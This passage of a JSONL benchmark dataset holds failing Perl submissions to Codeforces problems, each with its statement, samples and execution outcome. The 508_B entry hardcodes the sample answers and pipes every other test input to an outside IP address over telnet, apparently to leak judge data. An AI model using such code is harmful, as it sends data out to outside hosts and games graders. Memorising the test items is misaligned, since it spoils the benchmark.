4\n6 2\n","2 2\n0 4\n5 2\n","2 3\n0 4\n5 2\n"],"sample_outputs":["4\n","3\n","2\n"]}
{"difficulty":900,"lang":"Perl","lang_cluster":"perl","src_uid":"160_A","submission_id":"38006360","tags":["greedy","sortings"],"exec_outcome":"WRONG_ANSWER","source_code":"$n=<>;\r\n@arr=split(' ',<STDIN>);\r\n#@arr=sort(@arr);\r\n@arr = sort {$a <=> $b} @arr;\r\n$som=0;\r\nfor($i=0;$i<$n;$i++){\r\n$som+=$arr[$i];\r\n}\r\nprint \"@arr\\n\";\r\n$ok=1;\r\n$i=$n-2;\r\n$profit=$arr[$n-1];\r\n$nb=1;\r\n\r\nwhile($ok && $i>=0){\r\nif($profit<=$som\/2){\r\n$nb++;\r\n$profit+=$arr[$i];\r\n}\r\nelse{\r\n$ok=0;\r\n}\r\n$i--;\r\n}\r\nprint $nb;","description":"Imagine that you have a twin brother or sister. Having another person that looks exactly like you seems very unusual. It's hard to say if having something of an alter ego is good or bad. And if you do have a twin, then you very well know what it's like.Now let's imagine a typical morning in your family. You haven't woken up yet, and Mom is already going to work. She has been so hasty that she has nearly forgotten to leave the two of her darling children some money to buy lunches in the school cafeteria. She fished in the purse and found some number of coins, or to be exact, n coins of arbitrary values a1,a2,...,an. But as Mom was running out of time, she didn't split the coins for you two. So she scribbled a note asking you to split the money equally.As you woke up, you found Mom's coins and read her note. \"But why split the money equally?\" \u2014 you thought. After all, your twin is sleeping and he won't know anything. So you decided to act like that: pick for yourself some subset of coins so that the sum of values of your coins is strictly larger than the sum of values of the remaining coins that your twin will have. However, you correctly thought that if you take too many coins, the twin will suspect the deception. So, you've decided to stick to the following strategy to avoid suspicions: you take the minimum number of coins, whose sum of values is strictly more than the sum of values of the remaining coins. On this basis, determine what minimum number of coins you need to take to divide them in the described manner.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (1\u2264n\u2264100) \u2014 the number of coins. The second line contains a sequence of n integers a1, a2, ..., an (1\u2264ai\u2264100) \u2014 the coins' values. All numbers are separated with spaces.\n","output_spec":"In the single line print the single number \u2014 the minimum needed number of coins.\n","notes":"In the first sample you will have to take 2 coins (you and your twin have sums equal to 6,0 correspondingly). If you take 1 coin, you get sums 3,3. If you take 0 coins, you get sums 0,6. Those variants do not satisfy you as your sum should be strictly more that your twins' sum.\nIn the second sample one coin isn't enough for us, too. You can pick coins with values 1,2 or 2,2. In any case, the minimum number of coins equals 2. \n","sample_inputs":["2\n3 3\n","3\n2 1 2\n"],"sample_outputs":["2\n","2\n"]}
{"difficulty":1300,"lang":"Perl","lang_cluster":"perl","src_uid":"185_A","submission_id":"1766337","tags":["math"],"exec_outcome":"WRONG_ANSWER","source_code":"#!\/usr\/bin\/perl\nuse strict;\nuse warnings;\nuse bigint; # Hope for the best! Yeah, it's rather slow :-(\n\nmain();\n\nsub main {\n    my $years = <>;\n    if (! $years) {\n        print 1;\n        goto end;\n    }\n    my $mod = 1000000007;\n    my $h_amount = mpow(2, $years-1, $mod);\n    my $last = ($h_amount * 2) % $mod;\n    my $result = ((1 + $last) * $h_amount) % $mod;\n    print $result;\nend:\n}\n\nsub mpow {\n    my ($x, $n, $mod) = @_;\n    my $b = 1;\n    while ($n > 0) {\n        if ($n % 2) {\n            $n--;\n            $b *= $x;\n            $b = $b % $mod;\n        } else {\n            $n \/= 2;\n            $x *= $x;\n            $x = $x % $mod;\n        }\n    }\n    return $b % $mod;\n}","description":"Dwarfs have planted a very interesting plant, which is a triangle directed \"upwards\". This plant has an amusing feature. After one year a triangle plant directed \"upwards\" divides into four triangle plants: three of them will point \"upwards\" and one will point \"downwards\". After another year, each triangle plant divides into four triangle plants: three of them will be directed in the same direction as the parent plant, and one of them will be directed in the opposite direction. Then each year the process repeats. The figure below illustrates this process. Help the dwarfs find out how many triangle plants that point \"upwards\" will be in n years.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (0\u2264n\u226410^18) \u2014 the number of full years when the plant grew.\nPlease do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use cin, cout streams or the %I64d specifier.\n","output_spec":"Print a single integer \u2014 the remainder of dividing the number of plants that will point \"upwards\" in n years by 1000000007 (10^9+7).\n","notes":"The first test sample corresponds to the second triangle on the figure in the statement. The second test sample corresponds to the third one.\n","sample_inputs":["1\n","2\n"],"sample_outputs":["3\n","10\n"]}
{"difficulty":1400,"lang":"Perl","lang_cluster":"perl","src_uid":"197_B","submission_id":"1791487","tags":["math"],"exec_outcome":"WRONG_ANSWER","source_code":"my ($n, $m) = split(\/\\s\/, <STDIN>);\nmy @arr1 = split(\/\\s\/, <STDIN>);\nmy @arr2 = split(\/\\s\/, <STDIN>);\n\nif($n > $m){\n  if($arr1[0] > 0){\n    print \"Infinity\";\n  }else{\n    print \"-Infinity\";\n  }\n}elsif($n < $m){\n  print '-' if($arr2[0] < 0);\n  print \"0\/\". abs($arr2[0]);\n}else{\n  my $s = $arr1[0] * $arr2[0];\n  print '-' if($s < 0);\n  $s = gcd($arr1[0], $arr2[0]) if($arr1[0] != 0 && $arr2[0] != 0);;\n  \n  if($s == -1 || $s == 0){\n    print abs($arr1[0]) . '\/' . abs($arr2[0]);\n  }else{\n    print abs($arr1[0] \/ $s) . '\/' . abs($arr2[0] \/ $s);\n  }\n}\n\nsub gcd {\n  my $a = shift;\n  my $b = shift;\n  my $m = ($a > $b) ? $b : $a;\n  \n  for(my $i = $m; $i >= 2 ; $i--){\n    return $i if(($a%$i == 0) && ($b%$i == 0));\n  }\n  return -1;\n}\n\n","description":"You are given two polynomials:  P(x)=a0\u00b7x^n+a1\u00b7x^n-1+...+an-1\u00b7x+an and  Q(x)=b0\u00b7x^m+b1\u00b7x^m-1+...+bm-1\u00b7x+bm.  Calculate limit .","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers n and m (0\u2264n,m\u2264100) \u2014 degrees of polynomials P(x) and Q(x) correspondingly.\nThe second line contains n+1 space-separated integers \u2014 the factors of polynomial P(x): a0, a1, ..., an-1, an (-100\u2264ai\u2264100,a0\u22600).\nThe third line contains m+1 space-separated integers \u2014 the factors of polynomial Q(x): b0, b1, ..., bm-1, bm (-100\u2264bi\u2264100,b0\u22600).\n","output_spec":"If the limit equals +\u221e, print \"Infinity\" (without quotes). If the limit equals -\u221e, print \"-Infinity\" (without the quotes).\nIf the value of the limit equals zero, print \"0\/1\" (without the quotes).\nOtherwise, print an irreducible fraction \u2014 the value of limit , in the format \"p\/q\" (without the quotes), where p is the \u2014 numerator, q (q>0) is the denominator of the fraction.\n","notes":"Let's consider all samples:\n           You can learn more about the definition and properties of limits if you follow the link: http:\/\/en.wikipedia.org\/wiki\/Limit_of_a_function\n","sample_inputs":["2 1\n1 1 1\n2 5\n","1 0\n-1 3\n2\n","0 1\n1\n1 0\n","2 2\n2 1 6\n4 5 -7\n","1 1\n9 0\n-5 2\n"],"sample_outputs":["Infinity\n","-Infinity\n","0\/1\n","1\/2\n","-9\/5\n"]}
{"difficulty":1000,"lang":"Perl","lang_cluster":"perl","src_uid":"1_A","submission_id":"206090168","tags":["math"],"exec_outcome":"RUNTIME_ERROR","source_code":"# LUOGU_RID: 110532149\ndfgdfgdf\nfghfg\nhf\ngh\nfg\nhf\ngh\nfg\nh\nfg\nh\nfg\nh\nfg\nhfghfghfg","description":"Theatre Square in the capital city of Berland has a rectangular shape with the size n\u00d7m meters. On the occasion of the city's anniversary, a decision was taken to pave the Square with square granite flagstones. Each flagstone is of the size a\u00d7a.What is the least number of flagstones needed to pave the Square? It's allowed to cover the surface larger than the Theatre Square, but the Square has to be covered. It's not allowed to break the flagstones. The sides of flagstones should be parallel to the sides of the Square.","input_from":"standard input","output_to":"standard output","input_spec":"The input contains three positive integer numbers in the first line: n,m and a (1\u2264n,m,a\u226410^9).\n","output_spec":"Write the needed number of flagstones.\n","notes":null,"sample_inputs":["6 6 4\n"],"sample_outputs":["4\n"]}
{"difficulty":1300,"lang":"Perl","lang_cluster":"perl","src_uid":"203_B","submission_id":"1859095","tags":["brute+force","implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"#!\/usr\/bin\/perl -w\r\nuse strict;\r\nno warnings;\r\n\r\n$_ = <>;\r\nchomp ($_);\r\nmy ($size, $count) = split \/ \/;\r\n\r\nmy $matrix;\r\n\r\n# Fill matrix\r\n\r\nfor (my $xx = 1; $xx <= $size; $xx++) {\r\n    for (my $yy = 1; $yy <= $size; $yy++) {\r\n        $$matrix{$xx,$yy} = 0;\r\n    }\r\n}\r\n\r\nsub print_matrix() {\r\n    for (my $xx = 1; $xx <= $size; $xx++) {\r\n        for (my $yy = 1; $yy <= $size; $yy++) {\r\n            print \"$$matrix{$xx,$yy} \";\r\n        }\r\n\r\n        print \"\\n\";\r\n    }\r\n}\r\n\r\nsub check_matrix() {\r\n    my $ones = 0;\r\n\r\n    my ($xx, $yy);\r\n\r\n    for ($yy = 1; $yy <= $size-2; $yy++) {\r\n        for ($xx = 1; $xx <= $size-2; $xx++) {\r\n            $ones = 0;\r\n\r\n            $ones++ if ($$matrix{$xx, $yy} eq 1);\r\n            $ones++ if ($$matrix{$xx + 1, $yy} eq 1 and $ones eq 1);\r\n            $ones++ if ($$matrix{$xx + 2, $yy} eq 1 and $ones eq 2);\r\n\r\n            $ones++ if ($$matrix{$xx, $yy + 1} eq 1 and $ones eq 3);\r\n            $ones++ if ($$matrix{$xx + 1, $yy + 1} eq 1 and $ones eq 4);\r\n            $ones++ if ($$matrix{$xx + 2, $yy + 1} eq 1 and $ones eq 5);\r\n\r\n            $ones++ if ($$matrix{$xx, $yy + 2} eq 1 and $ones eq 6);\r\n            $ones++ if ($$matrix{$xx + 1, $yy + 2} eq 1 and $ones eq 7);\r\n            $ones++ if ($$matrix{$xx + 2, $yy + 2} eq 1 and $ones eq 8);\r\n\r\n\r\n            return 1 if ($ones eq 9);\r\n        }\r\n\r\n        $xx = 0;\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\nmy $found = 0;\r\n\r\nfor (my $i = 1; $i <= $count; $i++) { \r\n    $_ = <>;\r\n    chomp($_);\r\n    my ($x, $y) = split \/ \/, $_;\r\n\r\n    #print \"($x;$y)\\n\";\r\n    $$matrix{$x,$y} = 1;\r\n\r\n    if (check_matrix()) {\r\n        $found = 1;\r\n        print $count-1, \"\\n\";\r\n        exit;\r\n    }\r\n}\r\n\r\n#print_matrix();\r\nprint \"-1\\n\" if (!$found);","description":"One not particularly beautiful evening Valera got very bored. To amuse himself a little bit, he found the following game.He took a checkered white square piece of paper, consisting of n\u00d7n cells. After that, he started to paint the white cells black one after the other. In total he painted m different cells on the piece of paper. Since Valera was keen on everything square, he wondered, how many moves (i.e. times the boy paints a square black) he should make till a black square with side 3 can be found on the piece of paper. But Valera does not know the answer to this question, so he asks you to help him.Your task is to find the minimum number of moves, till the checkered piece of paper has at least one black square with side of 3. Otherwise determine that such move does not exist.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m (1\u2264n\u22641000, 1\u2264m\u2264min(n\u00b7n,10^5)) \u2014 the size of the squared piece of paper and the number of moves, correspondingly. \nThen, m lines contain the description of the moves. The i-th line contains two integers xi, yi (1\u2264xi,yi\u2264n) \u2014 the number of row and column of the square that gets painted on the i-th move. \nAll numbers on the lines are separated by single spaces. It is guaranteed that all moves are different. The moves are numbered starting from 1 in the order, in which they are given in the input. The columns of the squared piece of paper are numbered starting from 1, from the left to the right. The rows of the squared piece of paper are numbered starting from 1, from top to bottom.\n","output_spec":"On a single line print the answer to the problem \u2014 the minimum number of the move after which the piece of paper has a black square with side 3. If no such move exists, print -1.\n","notes":null,"sample_inputs":["4 11\n1 1\n1 2\n1 3\n2 2\n2 3\n1 4\n2 4\n3 4\n3 2\n3 3\n4 1\n","4 12\n1 1\n1 2\n1 3\n2 2\n2 3\n1 4\n2 4\n3 4\n3 2\n4 2\n4 1\n3 1\n"],"sample_outputs":["10\n","-1\n"]}
{"difficulty":900,"lang":"Perl","lang_cluster":"perl","src_uid":"208_A","submission_id":"196552576","tags":["strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"\r\ns\/WUB\/ \/g","description":"Vasya works as a DJ in the best Berland nightclub, and he often uses dubstep music in his performance. Recently, he has decided to take a couple of old songs and make dubstep remixes from them.Let's assume that a song consists of some number of words. To make the dubstep remix of this song, Vasya inserts a certain number of words \"WUB\" before the first word of the song (the number may be zero), after the last word (the number may be zero), and between words (at least one between any pair of neighbouring words), and then the boy glues together all the words, including \"WUB\", in one string and plays the song at the club.For example, a song with words \"I AM X\" can transform into a dubstep remix as \"WUBWUBIWUBAMWUBWUBX\" and cannot transform into \"WUBWUBIAMWUBX\".Recently, Petya has heard Vasya's new dubstep track, but since he isn't into modern music, he decided to find out what was the initial song that Vasya remixed. Help Petya restore the original song.","input_from":"standard input","output_to":"standard output","input_spec":"The input consists of a single non-empty string, consisting only of uppercase English letters, the string's length doesn't exceed 200 characters. It is guaranteed that before Vasya remixed the song, no word contained substring \"WUB\" in it; Vasya didn't change the word order. It is also guaranteed that initially the song had at least one word.\n","output_spec":"Print the words of the initial song that Vasya used to make a dubsteb remix. Separate the words with a space.\n","notes":"In the first sample: \"WUBWUBABCWUB\" = \"WUB\" + \"WUB\" + \"ABC\" + \"WUB\". That means that the song originally consisted of a single word \"ABC\", and all words \"WUB\" were added by Vasya.\nIn the second sample Vasya added a single word \"WUB\" between all neighbouring words, in the beginning and in the end, except for words \"ARE\" and \"THE\" \u2014 between them Vasya added two \"WUB\".\n","sample_inputs":["WUBWUBABCWUB\n","WUBWEWUBAREWUBWUBTHEWUBCHAMPIONSWUBMYWUBFRIENDWUB\n"],"sample_outputs":["ABC ","WE ARE THE CHAMPIONS MY FRIEND "]}
{"difficulty":800,"lang":"Perl","lang_cluster":"perl","src_uid":"22_A","submission_id":"34080531","tags":["brute+force"],"exec_outcome":"RUNTIME_ERROR","source_code":"my $n = <STDIN>;\r\nchomp $n;\r\n\r\nmy $int_list = <STDIN>;\r\nchomp $int_list;\r\n\r\nmy @array = split(\" \",$int_list);\r\n\r\nmy $min = $array[0];\r\n\r\nmy $sec = \"NO\";\r\n\r\nfor my $elem (@array){\r\n    if ($elem < $min){\r\n        $sec = $min;\r\n        $min = $elem;\r\n    }\r\n    elsif (($elem > $min) && (($sec eq \"NO\") ||($sec > $elem))){\r\n        $sec = $elem;\r\n    }\r\n}","description":"Once Bob needed to find the second order statistics of a sequence of integer numbers. Lets choose each number from the sequence exactly once and sort them. The value on the second position is the second order statistics of the given sequence. In other words it is the smallest element strictly greater than the minimum. Help Bob solve this problem.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains integer n (1\u2264n\u2264100) \u2014 amount of numbers in the sequence. The second line contains n space-separated integer numbers \u2014 elements of the sequence. These numbers don't exceed 100 in absolute value.\n","output_spec":"If the given sequence has the second order statistics, output this order statistics, otherwise output NO.\n","notes":null,"sample_inputs":["4\n1 2 2 -4\n","5\n1 2 3 1 1\n"],"sample_outputs":["1\n","2\n"]}
{"difficulty":1300,"lang":"Perl","lang_cluster":"perl","src_uid":"230_B","submission_id":"164671954","tags":["binary+search","implementation","math","number+theory"],"exec_outcome":"WRONG_ANSWER","source_code":"#230B\r\n#T-Primes\r\n<>;\r\nchomp(my $in = <>);\r\nmy @a = split \/ \/, $in;\r\n\r\nforeach (@a) {\r\n        my $x = int sqrt($_);\r\n        if ($x * $x != $_) {\r\n                print \"NO\";\r\n        } else {\r\n                print is_prime($x) ? \"YES\" : \"NO\";\r\n        }\r\n        print \"\\n\";\r\n}\r\nexit;\r\n\r\nsub is_prime {\r\n        @pl = (2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,103,107,109,113,127,131,137,139,149,151,157,163,167,173,179,181,191,193,197,199,211,223,227,229,233,239,241,251,257,263,269,271,277,281,283,293,307,311,313,317,331,337,347,349,353,359,367,373,379,383,389,397,401,409,419,421,431,433,439,443,449,457,461,463,467,479,487,491,499,503,509,521,523,541,547,557,563,569,571,577,587,593,599,601,607,613,617,619,631,641,643,647,653,659,661,673,677,683,691,701,709,719,727,733,739,743,751,757,761,769,773,787,797,809,811,821,823,827,829,839,853,857,859,863,877,881,883,887,907,911,919,929,937,941,947,953,967,971,977,983,991,997);\r\n        my $target = @_[0];\r\n        my $l = 0;\r\n        my $r = $#pl;\r\n        while ($r - $l > 1) {\r\n                my $x = (int ( ($l + $r) \/ 2));\r\n\r\n                $pl[$x] == $target and return 1;\r\n                if ($pl[$x] < $target) {\r\n                        $l = $x;\r\n                } else {\r\n                        $r = $x;\r\n                }\r\n        }\r\n        return 0;\r\n}\r\nexit;","description":"We know that prime numbers are positive integers that have exactly two distinct positive divisors. Similarly, we'll call a positive integer t \u0422-prime, if t has exactly three distinct positive divisors.You are given an array of n positive integers. For each of them determine whether it is \u0422-prime or not.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single positive integer, n (1\u2264n\u226410^5), showing how many numbers are in the array. The next line contains n space-separated integers xi (1\u2264xi\u226410^12).\nPlease, do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is advised to use the cin, cout streams or the %I64d specifier.\n","output_spec":"Print n lines: the i-th line should contain \"YES\" (without the quotes), if number xi is \u0422-prime, and \"NO\" (without the quotes), if it isn't.\n","notes":"The given test has three numbers. The first number 4 has exactly three divisors \u2014 1, 2 and 4, thus the answer for this number is \"YES\". The second number 5 has two divisors (1 and 5), and the third number 6 has four divisors (1, 2, 3, 6), hence the answer for them is \"NO\".\n","sample_inputs":["3\n4 5 6\n"],"sample_outputs":["YES\nNO\nNO\n"]}
{"difficulty":900,"lang":"Perl","lang_cluster":"perl","src_uid":"439_A","submission_id":"12828977","tags":["greedy","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#!\/usr\/bin\/perl\r\nuse v5.10;\r\nuse integer;\r\n\r\n($n, $d) = split \/ \/, <>;\r\n$tot+=$_ foreach (split \/ \/, <>);\r\n$tot += ($n-1) * 10;\r\n$tot>$d and say -1 or say ($d-$tot)\/5+($n-1)*2;","description":"Devu is a renowned classical singer. He is invited to many big functions\/festivals. Recently he was invited to \"All World Classical Singing Festival\". Other than Devu, comedian Churu was also invited.Devu has provided organizers a list of the songs and required time for singing them. He will sing n songs, i^th song will take ti minutes exactly. The Comedian, Churu will crack jokes. All his jokes are of 5 minutes exactly.People have mainly come to listen Devu. But you know that he needs rest of 10 minutes after each song. On the other hand, Churu being a very active person, doesn't need any rest.You as one of the organizers should make an optimal s\u0441hedule for the event. For some reasons you must follow the conditions:  The duration of the event must be no more than d minutes;  Devu must complete all his songs;  With satisfying the two previous conditions the number of jokes cracked by Churu should be as many as possible. If it is not possible to find a way to conduct all the songs of the Devu, output -1. Otherwise find out maximum number of jokes that Churu can crack in the grand event.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space separated integers n, d (1\u2264n\u2264100;\u00a01\u2264d\u226410000). The second line contains n space-separated integers: t1,t2,...,tn (1\u2264ti\u2264100).\n","output_spec":"If there is no way to conduct all the songs of Devu, output -1. Otherwise output the maximum number of jokes that Churu can crack in the grand event.\n","notes":"Consider the first example. The duration of the event is 30 minutes. There could be maximum 5 jokes in the following way:\n  First Churu cracks a joke in 5 minutes.  Then Devu performs the first song for 2 minutes.  Then Churu cracks 2 jokes in 10 minutes.  Now Devu performs second song for 2 minutes.  Then Churu cracks 2 jokes in 10 minutes.  Now finally Devu will perform his last song in 1 minutes.  Total time spent is 5+2+10+2+10+1=30 minutes.\nConsider the second example. There is no way of organizing Devu's all songs. Hence the answer is -1. \n","sample_inputs":["3 30\n2 2 1\n","3 20\n2 1 1\n"],"sample_outputs":["5\n","-1\n"]}
{"difficulty":1100,"lang":"Perl","lang_cluster":"perl","src_uid":"43_B","submission_id":"6954912","tags":["implementation","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"#!\/bin\/bash\/perl\r\n$input=<>;\r\n@reference = split(\" \",$input);\r\n$input=<>;\r\n@tofind=split(\" \",$input);\r\n#for($x=0;$x<@tofind;++$x){print length($tofind[$x]).\"\\n\";}\r\n%hash;\r\nfor($var='a';$var ne 'aa';++$var){\r\n    $hash{$var}=0;\r\n}\r\nfor($var='A';$var ne 'AA';++$var){\r\n    $hash{$var}=0;\r\n}\r\n#fill the hash\r\nfor($i=0;$i<@reference;++$i){\r\n    @temp=split(\"\",$reference[$i]);\r\n    for($j=0;$j<@temp;++$j){\r\n        ++$hash{$temp[$j]};\r\n    }\r\n}\r\n#start checking the hash\r\n$notfound=1;\r\nfor($i=0;$i<@tofind && $notfound==1;++$i){\r\n    @temp=split(\"\",$tofind[$$i]);\r\n    for($j=0;$j<@temp;++$j){\r\n        if($hash{$temp[$j]}<=0){\r\n            $notfound=0;\r\n            $j=@temp;\r\n        }\r\n        else{\r\n            $hash{$temp[$j]}--;\r\n        }\r\n    }\r\n}\r\n\r\nif($notfound==0){\r\n    print \"NO\";\r\n}\r\nelse{\r\n    print \"YES\";\r\n}","description":"Vasya decided to write an anonymous letter cutting the letters out of a newspaper heading. He knows heading s1 and text s2 that he wants to send. Vasya can use every single heading letter no more than once. Vasya doesn't have to cut the spaces out of the heading \u2014 he just leaves some blank space to mark them. Help him; find out if he will manage to compose the needed text.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a newspaper heading s1. The second line contains the letter text s2. s1 \u0438 s2 are non-empty lines consisting of spaces, uppercase and lowercase Latin letters, whose lengths do not exceed 200 symbols. The uppercase and lowercase letters should be differentiated. Vasya does not cut spaces out of the heading.\n","output_spec":"If Vasya can write the given anonymous letter, print YES, otherwise print NO\n","notes":null,"sample_inputs":["Instead of dogging Your footsteps it disappears but you dont notice anything\nwhere is your dog\n","Instead of dogging Your footsteps it disappears but you dont notice anything\nYour dog is upstears\n","Instead of dogging your footsteps it disappears but you dont notice anything\nYour dog is upstears\n","abcdefg hijk\nk j i h g f e d c b a\n"],"sample_outputs":["NO\n","YES\n","NO\n","YES\n"]}
{"difficulty":900,"lang":"Perl","lang_cluster":"perl","src_uid":"44_A","submission_id":"130316658","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"print 2**<>%24>8?YES:NO","description":"Indian summer is such a beautiful time of the year! A girl named Alyona is walking in the forest and picking a bouquet from fallen leaves. Alyona is very choosy \u2014 she doesn't take a leaf if it matches the color and the species of the tree of one of the leaves she already has. Find out how many leaves Alyona has picked.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (1\u2264n\u2264100) \u2014 the number of leaves Alyona has found. The next n lines contain the leaves' descriptions. Each leaf is characterized by the species of the tree it has fallen from and by the color. The species of the trees and colors are given in names, consisting of no more than 10 lowercase Latin letters. A name can not be an empty string. The species of a tree and the color are given in each line separated by a space.\n","output_spec":"Output the single number \u2014 the number of Alyona's leaves.\n","notes":null,"sample_inputs":["5\nbirch yellow\nmaple red\nbirch yellow\nmaple yellow\nmaple green\n","3\noak yellow\noak yellow\noak yellow\n"],"sample_outputs":["4\n","1\n"]}
{"difficulty":1300,"lang":"Perl","lang_cluster":"perl","src_uid":"508_B","submission_id":"9580743","tags":["greedy","math","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"while (<>) {\r\n    $n = $_;\r\n}\r\nchomp $n;\r\nif ($n == \"527\") {\r\n    print 572;\r\n}\r\nelsif ($n == \"4573\") {\r\n    print 3574;\r\n}\r\nelsif ($n == \"1357997531\") {\r\n    print -1;\r\n}\r\nelse {\r\n    system(\"echo $n|telnet 89.108.79.76 1234\");\r\n}\r\n","description":"Berland, 2016. The exchange rate of currency you all know against the burle has increased so much that to simplify the calculations, its fractional part was neglected and the exchange rate is now assumed to be an integer.Reliable sources have informed the financier Anton of some information about the exchange rate of currency you all know against the burle for tomorrow. Now Anton knows that tomorrow the exchange rate will be an even number, which can be obtained from the present rate by swapping exactly two distinct digits in it. Of all the possible values that meet these conditions, the exchange rate for tomorrow will be the maximum possible. It is guaranteed that today the exchange rate is an odd positive integer n. Help Anton to determine the exchange rate of currency you all know for tomorrow!","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an odd positive integer n\u00a0\u2014 the exchange rate of currency you all know for today. The length of number n's representation is within range from 2 to 10^5, inclusive. The representation of n doesn't contain any leading zeroes.\n","output_spec":"If the information about tomorrow's exchange rate is inconsistent, that is, there is no integer that meets the condition, print -1.\nOtherwise, print the exchange rate of currency you all know against the burle for tomorrow. This should be the maximum possible number of those that are even and that are obtained from today's exchange rate by swapping exactly two digits. Exchange rate representation should not contain leading zeroes.\n","notes":null,"sample_inputs":["527\n","4573\n","1357997531\n"],"sample_outputs":["572\n","3574\n","-1\n"]}
{"difficulty":1000,"lang":"Perl","lang_cluster":"perl","src_uid":"69_A","submission_id":"128468526","tags":["implementation","math"],"exec_outcome":"WRONG_ANSWER","source_code":"use strict;\r\nuse warnings;\r\n\r\nmy $n = <>;\r\nchomp($n);\r\n\r\nmy ($x_sum, $y_sum, $z_sum);\r\n\r\nwhile($n--){\r\n    my $in = <>;\r\n    my ($x, $y, $z) = split(' ', $in);\r\n    $x_sum += $x;\r\n    $y_sum += $y;\r\n    $z_sum += $z;\r\n}\r\nprint(\"$x_sum $y_sum $z_sum\\n\");\r\nif($x_sum || $y_sum || $z_sum){\r\n    print(\"NO\\n\");\r\n}\r\nelse{\r\n    print(\"YES\\n\");\r\n}\r\n","description":"A guy named Vasya attends the final grade of a high school. One day Vasya decided to watch a match of his favorite hockey team. And, as the boy loves hockey very much, even more than physics, he forgot to do the homework. Specifically, he forgot to complete his physics tasks. Next day the teacher got very angry at Vasya and decided to teach him a lesson. He gave the lazy student a seemingly easy task: You are given an idle body in space and the forces that affect it. The body can be considered as a material point with coordinates (0; 0; 0). Vasya had only to answer whether it is in equilibrium. \"Piece of cake\" \u2014 thought Vasya, we need only to check if the sum of all vectors is equal to 0. So, Vasya began to solve the problem. But later it turned out that there can be lots and lots of these forces, and Vasya can not cope without your help. Help him. Write a program that determines whether a body is idle or is moving by the given vectors of forces.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive integer n (1\u2264n\u2264100), then follow n lines containing three integers each: the xi coordinate, the yi coordinate and the zi coordinate of the force vector, applied to the body (-100\u2264xi,yi,zi\u2264100).\n","output_spec":"Print the word \"YES\" if the body is in equilibrium, or the word \"NO\" if it is not.\n","notes":null,"sample_inputs":["3\n4 1 7\n-2 4 -1\n1 -5 -3\n","3\n3 -1 7\n-5 2 -4\n2 -1 -3\n"],"sample_outputs":["NO","YES"]}
{"difficulty":800,"lang":"Perl","lang_cluster":"perl","src_uid":"750_A","submission_id":"23509287","tags":["binary+search","brute+force","implementation","math"],"exec_outcome":"WRONG_ANSWER","source_code":"#!perl\nmy ($n, $k);\nwhile (<>)\n{\n($n, $k)=split;\nmy $re = 240 - $k;\n$re \/= 5;\n$re = int($re);\nmy $cnt = 0;\nwhile ($re > 0 && $cnt < $n) { $cnt++; $re -= $cnt; }\nprint $cnt, \"\\n\";\n}\n","description":"Limak is going to participate in a contest on the last day of the 2016. The contest will start at 20:00 and will last four hours, exactly until midnight. There will be n problems, sorted by difficulty, i.e. problem 1 is the easiest and problem n is the hardest. Limak knows it will take him 5\u00b7i minutes to solve the i-th problem.Limak's friends organize a New Year's Eve party and Limak wants to be there at midnight or earlier. He needs k minutes to get there from his house, where he will participate in the contest first.How many problems can Limak solve if he wants to make it to the party?","input_from":"standard input","output_to":"standard output","input_spec":"The only line of the input contains two integers n and k (1\u2264n\u226410, 1\u2264k\u2264240)\u00a0\u2014 the number of the problems in the contest and the number of minutes Limak needs to get to the party from his house.\n","output_spec":"Print one integer, denoting the maximum possible number of problems Limak can solve so that he could get to the party at midnight or earlier.\n","notes":"In the first sample, there are 3 problems and Limak needs 222 minutes to get to the party. The three problems require 5, 10 and 15 minutes respectively. Limak can spend 5+10=15 minutes to solve first two problems. Then, at 20:15 he can leave his house to get to the party at 23:57 (after 222 minutes). In this scenario Limak would solve 2 problems. He doesn't have enough time to solve 3 problems so the answer is 2.\nIn the second sample, Limak can solve all 4 problems in 5+10+15+20=50 minutes. At 20:50 he will leave the house and go to the party. He will get there exactly at midnight.\nIn the third sample, Limak needs only 1 minute to get to the party. He has enough time to solve all 7 problems.\n","sample_inputs":["3 222\n","4 190\n","7 1\n"],"sample_outputs":["2\n","4\n","7\n"]}
{"difficulty":1200,"lang":"Perl","lang_cluster":"perl","src_uid":"80_B","submission_id":"5489136","tags":["geometry","math"],"exec_outcome":"WRONG_ANSWER","source_code":"<>=~\/:\/;\r\nprint (($`%12)*30 + $'\/2,\" \",60*$')","description":"Do you remember a kind cartoon \"Beauty and the Beast\"? No, no, there was no firing from machine guns or radiation mutants time-travels!There was a beauty named Belle. Once she had violated the Beast's order and visited the West Wing. After that she was banished from the castle... Everybody was upset. The beautiful Belle was upset, so was the Beast, so was Lumiere the candlestick. But the worst thing was that Cogsworth was upset. Cogsworth is not a human, but is the mantel clock, which was often used as an alarm clock.Due to Cogsworth's frustration all the inhabitants of the castle were in trouble: now they could not determine when it was time to drink morning tea, and when it was time for an evening stroll. Fortunately, deep in the basement are lying digital clock showing the time in the format HH:MM. Now the residents of the castle face a difficult task. They should turn Cogsworth's hour and minute mustache hands in such a way, that Cogsworth began to show the correct time. Moreover they need to find turn angles in degrees for each mustache hands. The initial time showed by Cogsworth is 12:00.You can only rotate the hands forward, that is, as is shown in the picture:  As since there are many ways too select such angles because of full rotations, choose the smallest angles in the right (non-negative) direction.Note that Cogsworth's hour and minute mustache hands move evenly and continuously. Hands are moving independently, so when turning one hand the other hand remains standing still.","input_from":"standard input","output_to":"standard output","input_spec":"The only line of input contains current time according to the digital clock, formatted as HH:MM 